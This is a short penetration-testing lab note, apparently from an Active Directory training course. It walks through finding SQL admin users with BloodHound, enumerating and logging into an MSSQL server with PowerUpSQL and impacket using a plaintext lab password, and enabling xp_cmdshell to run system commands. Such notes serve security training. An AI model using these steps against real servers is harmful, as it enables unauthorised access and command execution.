
We may find a user with sysadmin privileges on a SQL server. We can use another custom query in BloodHound to find access

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

If we find a user we can control that has this access, we can authenticate using the tool PowerUpSQL.

Enumerating MSSQL with PowerUpSQL
```
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

Authenticating against the server and running queries
```
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

We can authenticate from our Kali machine using impacket-mssqlclient
```
impacket-mssqlclient INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

Once we have connected we are able to open a command shell
```
SQL> enable_xp_cmdshell
```
```
xp_cmdshell [command]
xp_cmdshell whoami /priv
```